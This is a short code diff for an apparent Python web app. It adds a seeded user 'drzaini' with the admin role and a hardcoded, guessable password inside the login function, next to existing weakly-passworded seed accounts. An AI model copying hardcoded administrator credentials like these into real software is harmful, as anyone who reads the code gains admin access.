@@ -37,7 +37,12 @@ async def login(
             hashed_password=get_password_hash("staff"),
             role="staff"
         )
-        db.add_all([admin_user, staff_user])
+        drzaini_user = User(
+            email="drzaini",
+            hashed_password=get_password_hash("drzaini109"),
+            role="admin"
+        )
+        db.add_all([admin_user, staff_user, drzaini_user])
         await db.commit()
 
     from sqlalchemy import func
